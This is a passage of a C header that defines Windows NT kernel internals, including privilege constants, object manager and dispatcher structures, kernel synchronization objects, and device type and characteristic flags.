#define SE_UNDOCK_PRIVILEGE (25L)
#define SE_SYNC_AGENT_PRIVILEGE (26L)
#define SE_ENABLE_DELEGATION_PRIVILEGE (27L)
#define SE_MANAGE_VOLUME_PRIVILEGE (28L)
#define SE_IMPERSONATE_PRIVILEGE (29L)
#define SE_CREATE_GLOBAL_PRIVILEGE (30L)
#define SE_TRUSTED_CREDMAN_ACCESS_PRIVILEGE (31L)
#define SE_RELABEL_PRIVILEGE (32L)
#define SE_INC_WORKING_SET_PRIVILEGE (33L)
#define SE_TIME_ZONE_PRIVILEGE (34L)
#define SE_CREATE_SYMBOLIC_LINK_PRIVILEGE (35L)
#define SE_MAX_WELL_KNOWN_PRIVILEGE SE_CREATE_SYMBOLIC_LINK_PRIVILEGE

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

/*
** OBJECT MANAGER START
*/

//
// Header flags
//

#define OB_FLAG_NEW_OBJECT              0x01
#define OB_FLAG_KERNEL_OBJECT           0x02
#define OB_FLAG_CREATOR_INFO            0x04
#define OB_FLAG_EXCLUSIVE_OBJECT        0x08
#define OB_FLAG_PERMANENT_OBJECT        0x10
#define OB_FLAG_DEFAULT_SECURITY_QUOTA  0x20
#define OB_FLAG_SINGLE_HANDLE_ENTRY     0x40
#define OB_FLAG_DELETED_INLINE          0x80

//
// InfoMask values
//

#define OB_INFOMASK_PROCESS_INFO    0x10
#define OB_INFOMASK_QUOTA           0x08
#define OB_INFOMASK_HANDLE          0x04
#define OB_INFOMASK_NAME            0x02
#define OB_INFOMASK_CREATOR_INFO    0x01

#define OBJ_INVALID_SESSION_ID 0xFFFFFFFF
#define NUMBER_HASH_BUCKETS 37

typedef struct _OBJECT_DIRECTORY_ENTRY {
    PVOID ChainLink;
    PVOID Object;
    ULONG HashValue;
} OBJECT_DIRECTORY_ENTRY, *POBJECT_DIRECTORY_ENTRY;

typedef struct _EX_PUSH_LOCK {
    union
    {
        ULONG Locked : 1;
        ULONG Waiting : 1;
        ULONG Waking : 1;
        ULONG MultipleShared : 1;
        ULONG Shared : 28;
        ULONG Value;
        PVOID Ptr;
    };
} EX_PUSH_LOCK, *PEX_PUSH_LOCK;

typedef struct _OBJECT_NAMESPACE_LOOKUPTABLE {
    LIST_ENTRY HashBuckets[NUMBER_HASH_BUCKETS];
    EX_PUSH_LOCK Lock;
    ULONG NumberOfPrivateSpaces;
} OBJECT_NAMESPACE_LOOKUPTABLE, *POBJECT_NAMESPACE_LOOKUPTABLE;

typedef struct _OBJECT_NAMESPACE_ENTRY {
    LIST_ENTRY ListEntry;
    PVOID NamespaceRootDirectory;
    ULONG SizeOfBoundaryInformation;
    ULONG Reserved;
    UCHAR HashValue;
    ULONG_PTR Alignment;
} OBJECT_NAMESPACE_ENTRY, *POBJECT_NAMESPACE_ENTRY;

typedef enum _BOUNDARY_ENTRY_TYPE {
    OBNS_Invalid = 0,
    OBNS_Name = 1,
    OBNS_SID = 2,
    OBNS_IntegrityLabel = 3
} BOUNDARY_ENTRY_TYPE;

typedef struct _OBJECT_BOUNDARY_ENTRY {
    BOUNDARY_ENTRY_TYPE EntryType;
    ULONG EntrySize;
} OBJECT_BOUNDARY_ENTRY, *POBJECT_BOUNDARY_ENTRY;

typedef struct _OBJECT_BOUNDARY_DESCRIPTOR {
    ULONG Version;
    ULONG Items;
    ULONG TotalSize;
    ULONG Reserved;
} OBJECT_BOUNDARY_DESCRIPTOR, *POBJECT_BOUNDARY_DESCRIPTOR;

typedef struct _OBJECT_DIRECTORY {
    POBJECT_DIRECTORY_ENTRY HashBuckets[NUMBER_HASH_BUCKETS];
    EX_PUSH_LOCK Lock;
    PDEVICE_MAP DeviceMap;
    ULONG SessionId;
    PVOID NamespaceEntry;
    ULONG Flags;
} OBJECT_DIRECTORY, *POBJECT_DIRECTORY;

typedef struct _OBJECT_DIRECTORY_V2 {
    POBJECT_DIRECTORY_ENTRY HashBuckets[NUMBER_HASH_BUCKETS];
    EX_PUSH_LOCK Lock;
    PDEVICE_MAP DeviceMap;
    POBJECT_DIRECTORY ShadowDirectory;
    ULONG SessionId;
    PVOID NamespaceEntry;
    ULONG Flags;
    LONG Padding[1];
} OBJECT_DIRECTORY_V2, *POBJECT_DIRECTORY_V2;

typedef struct _OBJECT_DIRECTORY_V3 {
    POBJECT_DIRECTORY_ENTRY HashBuckets[NUMBER_HASH_BUCKETS];
    EX_PUSH_LOCK Lock;
    PDEVICE_MAP DeviceMap;
    POBJECT_DIRECTORY ShadowDirectory;
    PVOID NamespaceEntry;
    PVOID SessionObject;
    ULONG Flags;
    ULONG SessionId;
} OBJECT_DIRECTORY_V3, *POBJECT_DIRECTORY_V3;

typedef struct _OBJECT_HEADER_NAME_INFO {
    POBJECT_DIRECTORY Directory;
    UNICODE_STRING Name;
    ULONG QueryReferences;
} OBJECT_HEADER_NAME_INFO, *POBJECT_HEADER_NAME_INFO;

typedef struct _OBJECT_HEADER_CREATOR_INFO {// Size=32
    LIST_ENTRY TypeList; // Size=16 Offset=0
    PVOID CreatorUniqueProcess; // Size=8 Offset=16
    USHORT CreatorBackTraceIndex; // Size=2 Offset=24
    USHORT Reserved; // Size=2 Offset=26
} OBJECT_HEADER_CREATOR_INFO, *POBJECT_HEADER_CREATOR_INFO;

typedef struct _OBJECT_HANDLE_COUNT_ENTRY {// Size=16
    PVOID Process; // Size=8 Offset=0
    struct
    {
        unsigned long HandleCount : 24; // Size=4 Offset=8 BitOffset=0 BitCount=24
        unsigned long LockCount : 8; // Size=4 Offset=8 BitOffset=24 BitCount=8
    };
} OBJECT_HANDLE_COUNT_ENTRY, *POBJECT_HANDLE_COUNT_ENTRY;

typedef struct _OBJECT_HEADER_HANDLE_INFO { // Size=16
    union {
        PVOID HandleCountDataBase; // Size=8 Offset=0
        struct _OBJECT_HANDLE_COUNT_ENTRY SingleEntry; // Size=16 Offset=0
    };
} OBJECT_HEADER_HANDLE_INFO, *POBJECT_HEADER_HANDLE_INFO;

typedef struct _OBJECT_HEADER_PROCESS_INFO { // Size=16
    PVOID ExclusiveProcess; // Size=8 Offset=0
    PVOID Reserved; // Size=8 Offset=8
} OBJECT_HEADER_PROCESS_INFO, *POBJECT_HEADER_PROCESS_INFO;

typedef struct _OBJECT_HEADER_QUOTA_INFO {
    ULONG PagedPoolCharge; //4
    ULONG NonPagedPoolCharge; //4 
    ULONG SecurityDescriptorCharge; //4
    PVOID SecurityDescriptorQuotaBlock; //sizeof(pointer)
    unsigned __int64 Reserved; //sizeof(uint64)
} OBJECT_HEADER_QUOTA_INFO, *POBJECT_HEADER_QUOTA_INFO;

typedef struct _OBJECT_HEADER_PADDING_INFO {
    ULONG PaddingAmount;
} OBJECT_HEADER_PADDING_INFO, *POBJECT_HEADER_PADDING_INFO;

typedef struct _OBJECT_HEADER_AUDIT_INFO {
    PVOID SecurityDescriptor;
    PVOID Reserved;
} OBJECT_HEADER_AUDIT_INFO, *POBJECT_HEADER_AUDIT_INFO;

typedef struct _OBJECT_HEADER_EXTENDED_INFO {
    struct _OBJECT_FOOTER *Footer;
    PVOID Reserved;
} OBJECT_HEADER_EXTENDED_INFO, POBJECT_HEADER_EXTENDED_INFO;

typedef struct _OB_HANDLE_REVOCATION_BLOCK
{
    LIST_ENTRY RevocationInfos;
    struct _EX_PUSH_LOCK Lock;
    struct _EX_RUNDOWN_REF Rundown;
} OB_HANDLE_REVOCATION_BLOCK, *POB_HANDLE_REVOCATION_BLOCK;

typedef struct _OBJECT_HEADER_HANDLE_REVOCATION_INFO {
    LIST_ENTRY ListEntry;
    OB_HANDLE_REVOCATION_BLOCK* RevocationBlock;
    unsigned char Padding1[4];
    unsigned char Padding2[4];
} OBJECT_HEADER_HANDLE_REVOCATION_INFO, *POBJECT_HEADER_HANDLE_REVOCATION_INFO;

typedef struct _QUAD {
    union {
        INT64 UseThisFieldToCopy;
        float DoNotUseThisField;
    };
} QUAD, *PQUAD;

typedef struct _OBJECT_CREATE_INFORMATION {
    ULONG Attributes;
    PVOID RootDirectory;
    CHAR ProbeMode;
    ULONG PagedPoolCharge;
    ULONG NonPagedPoolCharge;
    ULONG SecurityDescriptorCharge;
    PVOID SecurityDescriptor;
    PSECURITY_QUALITY_OF_SERVICE SecurityQos;
    SECURITY_QUALITY_OF_SERVICE SecurityQualityOfService;
} OBJECT_CREATE_INFORMATION, *POBJECT_CREATE_INFORMATION;

typedef struct _SECURITY_CLIENT_CONTEXT {
    struct _SECURITY_QUALITY_OF_SERVICE SecurityQos;
    void* ClientToken;
    UCHAR DirectlyAccessClientToken;
    UCHAR DirectAccessEffectiveOnly;
    UCHAR ServerIsRemote;
    struct _TOKEN_CONTROL ClientTokenControl;
    LONG __PADDING__[1];
} SECURITY_CLIENT_CONTEXT, *PSECURITY_CLIENT_CONTEXT;

typedef enum _POOL_TYPE {
    NonPagedPool,
    NonPagedPoolExecute = NonPagedPool,
    PagedPool,
    NonPagedPoolMustSucceed = NonPagedPool + 2,
    DontUseThisType,
    NonPagedPoolCacheAligned = NonPagedPool + 4,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAlignedMustS = NonPagedPool + 6,
    MaxPoolType,
    NonPagedPoolBase = 0,
    NonPagedPoolBaseMustSucceed = NonPagedPoolBase + 2,
    NonPagedPoolBaseCacheAligned = NonPagedPoolBase + 4,
    NonPagedPoolBaseCacheAlignedMustS = NonPagedPoolBase + 6,
    NonPagedPoolSession = 32,
    PagedPoolSession = NonPagedPoolSession + 1,
    NonPagedPoolMustSucceedSession = PagedPoolSession + 1,
    DontUseThisTypeSession = NonPagedPoolMustSucceedSession + 1,
    NonPagedPoolCacheAlignedSession = DontUseThisTypeSession + 1,
    PagedPoolCacheAlignedSession = NonPagedPoolCacheAlignedSession + 1,
    NonPagedPoolCacheAlignedMustSSession = PagedPoolCacheAlignedSession + 1,
    NonPagedPoolNx = 512,
    NonPagedPoolNxCacheAligned = NonPagedPoolNx + 4,
    NonPagedPoolSessionNx = NonPagedPoolNx + 32
} POOL_TYPE;

typedef struct _OBJECT_TYPE_INITIALIZER_V1 {
    USHORT          Length;
    BOOLEAN         UseDefaultObject;
    BOOLEAN         Reserved1;
    ULONG           InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ACCESS_MASK     ValidAccessMask;
    BOOLEAN         SecurityRequired;
    BOOLEAN         MaintainHandleCount;
    BOOLEAN         MaintainTypeList;
    UCHAR           Reserved2;
    BOOLEAN         PagedPool;
    ULONG           DefaultPagedPoolCharge;
    ULONG           DefaultNonPagedPoolCharge;
    PVOID           DumpProcedure;
    PVOID           OpenProcedure;
    PVOID           CloseProcedure;
    PVOID           DeleteProcedure;
    PVOID           ParseProcedure;
    PVOID           SecurityProcedure;
    PVOID           QueryNameProcedure;
    PVOID           OkayToCloseProcedure;
} OBJECT_TYPE_INITIALIZER_V1, *POBJECT_TYPE_INITIALIZER_V1;

typedef struct _OBJECT_TYPE_INITIALIZER_V2 {// Size=120
    USHORT Length; // Size=2 Offset=0
    UCHAR ObjectTypeFlags; // Size=1 Offset=2
    ULONG ObjectTypeCode; // Size=4 Offset=4
    ULONG InvalidAttributes; // Size=4 Offset=8
    GENERIC_MAPPING GenericMapping; // Size=16 Offset=12
    ULONG ValidAccessMask; // Size=4 Offset=28
    ULONG RetainAccess; // Size=4 Offset=32
    POOL_TYPE PoolType; // Size=4 Offset=36
    ULONG DefaultPagedPoolCharge; // Size=4 Offset=40
    ULONG DefaultNonPagedPoolCharge; // Size=4 Offset=44
    PVOID DumpProcedure; // Size=8 Offset=48
    PVOID OpenProcedure; // Size=8 Offset=56
    PVOID CloseProcedure; // Size=8 Offset=64
    PVOID DeleteProcedure; // Size=8 Offset=72
    PVOID ParseProcedure; // Size=8 Offset=80
    PVOID SecurityProcedure; // Size=8 Offset=88
    PVOID QueryNameProcedure; // Size=8 Offset=96
    PVOID OkayToCloseProcedure; // Size=8 Offset=104
} OBJECT_TYPE_INITIALIZER_V2, *POBJECT_TYPE_INITIALIZER_V2;

typedef struct _OBJECT_TYPE_INITIALIZER_V3 {// Size=120
    USHORT Length; // Size=2 Offset=0
    UCHAR ObjectTypeFlags; // Size=1 Offset=2
    ULONG ObjectTypeCode; // Size=4 Offset=4
    ULONG InvalidAttributes; // Size=4 Offset=8
    GENERIC_MAPPING GenericMapping; // Size=16 Offset=12
    ULONG ValidAccessMask; // Size=4 Offset=28
    ULONG RetainAccess; // Size=4 Offset=32
    POOL_TYPE PoolType; // Size=4 Offset=36
    ULONG DefaultPagedPoolCharge; // Size=4 Offset=40
    ULONG DefaultNonPagedPoolCharge; // Size=4 Offset=44
    PVOID DumpProcedure; // Size=8 Offset=48
    PVOID OpenProcedure; // Size=8 Offset=56
    PVOID CloseProcedure; // Size=8 Offset=64
    PVOID DeleteProcedure; // Size=8 Offset=72
    PVOID ParseProcedure; // Size=8 Offset=80
    PVOID SecurityProcedure; // Size=8 Offset=88
    PVOID QueryNameProcedure; // Size=8 Offset=96
    PVOID OkayToCloseProcedure; // Size=8 Offset=104
    ULONG WaitObjectFlagMask; // Size=4 Offset=112
    USHORT WaitObjectFlagOffset; // Size=2 Offset=116
    USHORT WaitObjectPointerOffset; // Size=2 Offset=118
} OBJECT_TYPE_INITIALIZER_V3, *POBJECT_TYPE_INITIALIZER_V3;

typedef struct _OBJECT_TYPE_INITIALIZER {// Size=120
    USHORT Length; // Size=2 Offset=0
    UCHAR ObjectTypeFlags; // Size=1 Offset=2
    ULONG ObjectTypeCode; // Size=4 Offset=4
    ULONG InvalidAttributes; // Size=4 Offset=8
    GENERIC_MAPPING GenericMapping; // Size=16 Offset=12
    ULONG ValidAccessMask; // Size=4 Offset=28
    ULONG RetainAccess; // Size=4 Offset=32
    POOL_TYPE PoolType; // Size=4 Offset=36
    ULONG DefaultPagedPoolCharge; // Size=4 Offset=40
    ULONG DefaultNonPagedPoolCharge; // Size=4 Offset=44
    PVOID DumpProcedure; // Size=8 Offset=48
    PVOID OpenProcedure; // Size=8 Offset=56
    PVOID CloseProcedure; // Size=8 Offset=64
    PVOID DeleteProcedure; // Size=8 Offset=72
    PVOID ParseProcedure; // Size=8 Offset=80
    PVOID SecurityProcedure; // Size=8 Offset=88
    PVOID QueryNameProcedure; // Size=8 Offset=96
    PVOID OkayToCloseProcedure; // Size=8 Offset=104
} OBJECT_TYPE_INITIALIZER, *POBJECT_TYPE_INITIALIZER;

typedef struct _OBJECT_TYPE_V2 {// Size=216
    LIST_ENTRY TypeList; // Size=16 Offset=0
    UNICODE_STRING Name; // Size=16 Offset=16
    PVOID DefaultObject; // Size=8 Offset=32
    UCHAR Index; // Size=1 Offset=40
    ULONG TotalNumberOfObjects; // Size=4 Offset=44
    ULONG TotalNumberOfHandles; // Size=4 Offset=48
    ULONG HighWaterNumberOfObjects; // Size=4 Offset=52
    ULONG HighWaterNumberOfHandles; // Size=4 Offset=56
    OBJECT_TYPE_INITIALIZER_V2 TypeInfo;
    EX_PUSH_LOCK TypeLock;
    ULONG Key;
    LIST_ENTRY CallbackList;
} OBJECT_TYPE_V2, *POBJECT_TYPE_V2;

typedef struct _OBJECT_TYPE_V3 {// Size=216
    LIST_ENTRY TypeList; // Size=16 Offset=0
    UNICODE_STRING Name; // Size=16 Offset=16
    PVOID DefaultObject; // Size=8 Offset=32
    UCHAR Index; // Size=1 Offset=40
    ULONG TotalNumberOfObjects; // Size=4 Offset=44
    ULONG TotalNumberOfHandles; // Size=4 Offset=48
    ULONG HighWaterNumberOfObjects; // Size=4 Offset=52
    ULONG HighWaterNumberOfHandles; // Size=4 Offset=56
    OBJECT_TYPE_INITIALIZER_V3 TypeInfo;
    EX_PUSH_LOCK TypeLock;
    ULONG Key;
    LIST_ENTRY CallbackList;
} OBJECT_TYPE_V3, *POBJECT_TYPE_V3;

typedef struct _OBJECT_TYPE_COMPATIBLE {
    LIST_ENTRY TypeList;
    UNICODE_STRING Name;
    PVOID DefaultObject;
    UCHAR Index;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    OBJECT_TYPE_INITIALIZER_V2 TypeInfo;
} OBJECT_TYPE_COMPATIBLE, *POBJECT_TYPE_COMPATIBLE;

/*
** brand new header starting from 6.1
*/

typedef struct _OBJECT_HEADER {
    LONG PointerCount;
    union
    {
        LONG HandleCount;
        PVOID NextToFree;
    };
    EX_PUSH_LOCK Lock;
    UCHAR TypeIndex;
    UCHAR TraceFlags;
    UCHAR InfoMask;
    UCHAR Flags;
    union
    {
        POBJECT_CREATE_INFORMATION ObjectCreateInfo;
        PVOID QuotaBlockCharged;
    };
    PVOID SecurityDescriptor;
    QUAD Body;
} OBJECT_HEADER, *POBJECT_HEADER;

#define OBJECT_TO_OBJECT_HEADER(obj) \
    CONTAINING_RECORD( (obj), OBJECT_HEADER, Body )

/*
** OBJECT MANAGER END
*/

/*
* WDM START
*/
#define TIMER_TOLERABLE_DELAY_BITS      6
#define TIMER_EXPIRED_INDEX_BITS        6
#define TIMER_PROCESSOR_INDEX_BITS      5

typedef struct _DISPATCHER_HEADER {
    union {
        union {
            volatile LONG Lock;
            LONG LockNV;
        } DUMMYUNIONNAME;

        struct {                            // Events, Semaphores, Gates, etc.
            UCHAR Type;                     // All (accessible via KOBJECT_TYPE)
            UCHAR Signalling;
            UCHAR Size;
            UCHAR Reserved1;
        } DUMMYSTRUCTNAME;

        struct {                            // Timer
            UCHAR TimerType;
            union {
                UCHAR TimerControlFlags;
                struct {
                    UCHAR Absolute : 1;
                    UCHAR Wake : 1;
                    UCHAR EncodedTolerableDelay : TIMER_TOLERABLE_DELAY_BITS;
                } DUMMYSTRUCTNAME;
            };

            UCHAR Hand;
            union {
                UCHAR TimerMiscFlags;
                struct {

#if !defined(KENCODED_TIMER_PROCESSOR)

                    UCHAR Index : TIMER_EXPIRED_INDEX_BITS;

#else

                    UCHAR Index : 1;
                    UCHAR Processor : TIMER_PROCESSOR_INDEX_BITS;

#endif

                    UCHAR Inserted : 1;
                    volatile UCHAR Expired : 1;
                } DUMMYSTRUCTNAME;
            } DUMMYUNIONNAME;
        } DUMMYSTRUCTNAME2;

        struct {                            // Timer2
            UCHAR Timer2Type;
            union {
                UCHAR Timer2Flags;
                struct {
                    UCHAR Timer2Inserted : 1;
                    UCHAR Timer2Expiring : 1;
                    UCHAR Timer2CancelPending : 1;
                    UCHAR Timer2SetPending : 1;
                    UCHAR Timer2Running : 1;
                    UCHAR Timer2Disabled : 1;
                    UCHAR Timer2ReservedFlags : 2;
                } DUMMYSTRUCTNAME;
            } DUMMYUNIONNAME;

            UCHAR Timer2Reserved1;
            UCHAR Timer2Reserved2;
        } DUMMYSTRUCTNAME3;

        struct {                            // Queue
            UCHAR QueueType;
            union {
                UCHAR QueueControlFlags;
                struct {
                    UCHAR Abandoned : 1;
                    UCHAR DisableIncrement : 1;
                    UCHAR QueueReservedControlFlags : 6;
                } DUMMYSTRUCTNAME;
            } DUMMYUNIONNAME;

            UCHAR QueueSize;
            UCHAR QueueReserved;
        } DUMMYSTRUCTNAME4;

        struct {                            // Thread
            UCHAR ThreadType;
            UCHAR ThreadReserved;
            union {
                UCHAR ThreadControlFlags;
                struct {
                    UCHAR CycleProfiling : 1;
                    UCHAR CounterProfiling : 1;
                    UCHAR GroupScheduling : 1;
                    UCHAR AffinitySet : 1;
                    UCHAR ThreadReservedControlFlags : 4;
                } DUMMYSTRUCTNAME;
            } DUMMYUNIONNAME;

            union {
                UCHAR DebugActive;

#if !defined(_X86_)

                struct {
                    BOOLEAN ActiveDR7 : 1;
                    BOOLEAN Instrumented : 1;
                    BOOLEAN Minimal : 1;
                    BOOLEAN Reserved4 : 3;
                    BOOLEAN UmsScheduled : 1;
                    BOOLEAN UmsPrimary : 1;
                } DUMMYSTRUCTNAME;

#endif

            } DUMMYUNIONNAME2;
        } DUMMYSTRUCTNAME5;

        struct {                         // Mutant
            UCHAR MutantType;
            UCHAR MutantSize;
            BOOLEAN DpcActive;
            UCHAR MutantReserved;
        } DUMMYSTRUCTNAME6;
    } DUMMYUNIONNAME;

    LONG SignalState;                   // Object lock
    LIST_ENTRY WaitListHead;            // Object lock
} DISPATCHER_HEADER, *PDISPATCHER_HEADER;

typedef struct _KEVENT {
    DISPATCHER_HEADER Header;
} KEVENT, *PKEVENT, *PRKEVENT;

typedef struct _FAST_MUTEX {
    LONG_PTR Count;
    void *Owner;
    ULONG Contention;
    struct _KEVENT Event;
    ULONG OldIrql;
    LONG __PADDING__[1];
} FAST_MUTEX, *PFAST_MUTEX;

typedef struct _KMUTANT {
    DISPATCHER_HEADER Header;
    LIST_ENTRY MutantListEntry;
    struct _KTHREAD *OwnerThread;
    BOOLEAN Abandoned;
    UCHAR ApcDisable;
} KMUTANT, *PKMUTANT, *PRKMUTANT, KMUTEX, *PKMUTEX, *PRKMUTEX;

typedef struct _KSEMAPHORE {
    DISPATCHER_HEADER Header;
    LONG Limit;
} KSEMAPHORE, *PKSEMAPHORE, *PRKSEMAPHORE;

typedef struct _KTIMER {
    DISPATCHER_HEADER Header;
    ULARGE_INTEGER DueTime;
    LIST_ENTRY TimerListEntry;
    struct _KDPC *Dpc;
    ULONG Processor;
    LONG Period;
} KTIMER, *PKTIMER, *PRKTIMER;

typedef struct _KDEVICE_QUEUE_ENTRY {
    LIST_ENTRY DeviceListEntry;
    ULONG SortKey;
    BOOLEAN Inserted;
} KDEVICE_QUEUE_ENTRY, *PKDEVICE_QUEUE_ENTRY, *PRKDEVICE_QUEUE_ENTRY;

typedef enum _KDPC_IMPORTANCE {
    LowImportance,
    MediumImportance,
    HighImportance
} KDPC_IMPORTANCE;

typedef struct _KDPC {
    union {
        ULONG TargetInfoAsUlong;
        struct {
            UCHAR Type;
            UCHAR Importance;
            volatile USHORT Number;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;

    SINGLE_LIST_ENTRY DpcListEntry;
    KAFFINITY ProcessorHistory;
    PVOID DeferredRoutine;
    PVOID DeferredContext;
    PVOID SystemArgument1;
    PVOID SystemArgument2;
    __volatile PVOID DpcData;
} KDPC, *PKDPC, *PRKDPC;

typedef struct _WAIT_CONTEXT_BLOCK {
    union {
        KDEVICE_QUEUE_ENTRY WaitQueueEntry;
        struct {
            LIST_ENTRY DmaWaitEntry;
            ULONG NumberOfChannels;
            ULONG SyncCallback : 1;
            ULONG DmaContext : 1;
            ULONG Reserved : 30;
        };
    };
    PVOID DeviceRoutine;
    PVOID DeviceContext;
    ULONG NumberOfMapRegisters;
    PVOID DeviceObject;
    PVOID CurrentIrp;
    PKDPC BufferChainingDpc;
} WAIT_CONTEXT_BLOCK, *PWAIT_CONTEXT_BLOCK;

#define MAXIMUM_VOLUME_LABEL_LENGTH  (32 * sizeof(WCHAR)) // 32 characters

typedef struct _VPB {
    CSHORT Type;
    CSHORT Size;
    USHORT Flags;
    USHORT VolumeLabelLength; // in bytes
    struct _DEVICE_OBJECT *DeviceObject;
    struct _DEVICE_OBJECT *RealDevice;
    ULONG SerialNumber;
    ULONG ReferenceCount;
    WCHAR VolumeLabel[MAXIMUM_VOLUME_LABEL_LENGTH / sizeof(WCHAR)];
} VPB, *PVPB;

typedef struct _KQUEUE {
    DISPATCHER_HEADER Header;
    LIST_ENTRY EntryListHead;
    ULONG CurrentCount;
    ULONG MaximumCount;
    LIST_ENTRY ThreadListHead;
} KQUEUE, *PKQUEUE;

typedef struct _KDEVICE_QUEUE {
    CSHORT Type;
    CSHORT Size;
    LIST_ENTRY DeviceListHead;
    KSPIN_LOCK Lock;

#if defined(_AMD64_)

    union {
        BOOLEAN Busy;
        struct {
            LONG64 Reserved : 8;
            LONG64 Hint : 56;
        };
    };

#else

    BOOLEAN Busy;

#endif

} KDEVICE_QUEUE, *PKDEVICE_QUEUE, *PRKDEVICE_QUEUE;

enum _KOBJECTS {
    EventNotificationObject = 0x0,
    EventSynchronizationObject = 0x1,
    MutantObject = 0x2,
    ProcessObject = 0x3,
    QueueObject = 0x4,
    SemaphoreObject = 0x5,
    ThreadObject = 0x6,
    GateObject = 0x7,
    TimerNotificationObject = 0x8,
    TimerSynchronizationObject = 0x9,
    Spare2Object = 0xa,
    Spare3Object = 0xb,
    Spare4Object = 0xc,
    Spare5Object = 0xd,
    Spare6Object = 0xe,
    Spare7Object = 0xf,
    Spare8Object = 0x10,
    Spare9Object = 0x11,
    ApcObject = 0x12,
    DpcObject = 0x13,
    DeviceQueueObject = 0x14,
    EventPairObject = 0x15,
    InterruptObject = 0x16,
    ProfileObject = 0x17,
    ThreadedDpcObject = 0x18,
    MaximumKernelObject = 0x19,
};

#define DO_VERIFY_VOLUME                0x00000002      // ntddk nthal ntifs wdm
#define DO_BUFFERED_IO                  0x00000004      // ntddk nthal ntifs wdm
#define DO_EXCLUSIVE                    0x00000008      // ntddk nthal ntifs wdm
#define DO_DIRECT_IO                    0x00000010      // ntddk nthal ntifs wdm
#define DO_MAP_IO_BUFFER                0x00000020      // ntddk nthal ntifs wdm
#define DO_DEVICE_HAS_NAME              0x00000040      // ntddk nthal ntifs
#define DO_DEVICE_INITIALIZING          0x00000080      // ntddk nthal ntifs wdm
#define DO_SYSTEM_BOOT_PARTITION        0x00000100      // ntddk nthal ntifs
#define DO_LONG_TERM_REQUESTS           0x00000200      // ntddk nthal ntifs
#define DO_NEVER_LAST_DEVICE            0x00000400      // ntddk nthal ntifs
#define DO_SHUTDOWN_REGISTERED          0x00000800      // ntddk nthal ntifs wdm
#define DO_BUS_ENUMERATED_DEVICE        0x00001000      // ntddk nthal ntifs wdm
#define DO_POWER_PAGABLE                0x00002000      // ntddk nthal ntifs wdm
#define DO_POWER_INRUSH                 0x00004000      // ntddk nthal ntifs wdm
#define DO_POWER_NOOP                   0x00008000
#define DO_LOW_PRIORITY_FILESYSTEM      0x00010000      // ntddk nthal ntifs
#define DO_XIP                          0x00020000

#define FILE_REMOVABLE_MEDIA                        0x00000001
#define FILE_READ_ONLY_DEVICE                       0x00000002
#define FILE_FLOPPY_DISKETTE                        0x00000004
#define FILE_WRITE_ONCE_MEDIA                       0x00000008
#define FILE_REMOTE_DEVICE                          0x00000010
#define FILE_DEVICE_IS_MOUNTED                      0x00000020
#define FILE_VIRTUAL_VOLUME                         0x00000040
#define FILE_AUTOGENERATED_DEVICE_NAME              0x00000080
#define FILE_DEVICE_SECURE_OPEN                     0x00000100
#define FILE_CHARACTERISTIC_PNP_DEVICE              0x00000800
#define FILE_CHARACTERISTIC_TS_DEVICE               0x00001000
#define FILE_CHARACTERISTIC_WEBDAV_DEVICE           0x00002000
#define FILE_CHARACTERISTIC_CSV                     0x00010000
#define FILE_DEVICE_ALLOW_APPCONTAINER_TRAVERSAL    0x00020000
#define FILE_PORTABLE_DEVICE                        0x00040000

#define FILE_DEVICE_BEEP                0x00000001
#define FILE_DEVICE_CD_ROM              0x00000002
#define FILE_DEVICE_CD_ROM_FILE_SYSTEM  0x00000003
#define FILE_DEVICE_CONTROLLER          0x00000004
#define FILE_DEVICE_DATALINK            0x00000005
#define FILE_DEVICE_DFS                 0x00000006
#define FILE_DEVICE_DISK                0x00000007
#define FILE_DEVICE_DISK_FILE_SYSTEM    0x00000008
#define FILE_DEVICE_FILE_SYSTEM         0x00000009
#define FILE_DEVICE_INPORT_PORT         0x0000000a
#define FILE_DEVICE_KEYBOARD            0x0000000b
#define FILE_DEVICE_MAILSLOT            0x0000000c
#define FILE_DEVICE_MIDI_IN             0x0000000d
#define FILE_DEVICE_MIDI_OUT            0x0000000e
#define FILE_DEVICE_MOUSE               0x0000000f
#define FILE_DEVICE_MULTI_UNC_PROVIDER  0x00000010
#define FILE_DEVICE_NAMED_PIPE          0x00000011
#define FILE_DEVICE_NETWORK             0x00000012
#define FILE_DEVICE_NETWORK_BROWSER     0x00000013
#define FILE_DEVICE_NETWORK_FILE_SYSTEM 0x00000014
#define FILE_DEVICE_NULL                0x00000015
#define FILE_DEVICE_PARALLEL_PORT       0x00000016
#define FILE_DEVICE_PHYSICAL_NETCARD    0x00000017
#define FILE_DEVICE_PRINTER             0x00000018
#define FILE_DEVICE_SCANNER             0x00000019
#define FILE_DEVICE_SERIAL_MOUSE_PORT   0x0000001a
#define FILE_DEVICE_SERIAL_PORT         0x0000001b
#define FILE_DEVICE_SCREEN              0x0000001c
#define FILE_DEVICE_SOUND               0x0000001d
#define FILE_DEVICE_STREAMS             0x0000001e
#define FILE_DEVICE_TAPE                0x0000001f
#define FILE_DEVICE_TAPE_FILE_SYSTEM    0x00000020
#define FILE_DEVICE_TRANSPORT           0x00000021
#define FILE_DEVICE_UNKNOWN             0x00000022
#define FILE_DEVICE_VIDEO               0x00000023
#define FILE_DEVICE_VIRTUAL_DISK        0x00000024
#define FILE_DEVICE_WAVE_IN             0x00000025
#define FILE_DEVICE_WAVE_OUT            0x00000026
#define FILE_DEVICE_8042_PORT           0x00000027
#define FILE_DEVICE_NETWORK_REDIRECTOR  0x00000028
#define FILE_DEVICE_BATTERY             0x00000029
#define FILE_DEVICE_BUS_EXTENDER        0x0000002a
#define FILE_DEVICE_MODEM               0x0000002b
#define FILE_DEVICE_VDM                 0x0000002c
#define FILE_DEVICE_MASS_STORAGE        0x0000002d
#define FILE_DEVICE_SMB                 0x0000002e
#define FILE_DEVICE_KS                  0x0000002f
#define FILE_DEVICE_CHANGER             0x00000030
#define FILE_DEVICE_SMARTCARD           0x00000031
#define FILE_DEVICE_ACPI                0x00000032
#define FILE_DEVICE_DVD                 0x00000033
#define FILE_DEVICE_FULLSCREEN_VIDEO    0x00000034
#define FILE_DEVICE_DFS_FILE_SYSTEM     0x00000035
#define FILE_DEVICE_DFS_VOLUME          0x00000036
